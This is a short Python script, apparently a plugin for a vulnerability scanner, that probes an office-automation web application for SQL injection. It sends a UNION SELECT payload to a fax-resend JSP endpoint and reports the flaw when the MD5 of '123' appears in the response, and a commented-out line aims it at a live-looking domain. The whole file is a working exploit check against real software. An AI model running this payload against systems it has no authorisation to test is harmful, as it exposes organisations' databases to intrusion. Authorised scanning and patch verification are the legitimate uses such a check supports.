# coding:utf-8
# http://www.yuanyuoa.com
import requests

class Exploit:

    def attack(self, url):
        path = "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20md5(123)%20--"
        target = url+path

        response = requests.get(target)
        if response.status_code == 200 and '202cb962ac59075b964b07152d234b70' in response.text:
            return "{} has SQL Injection.".format(target)

# print Exploit().attack('http://www.yuanyuoa.com')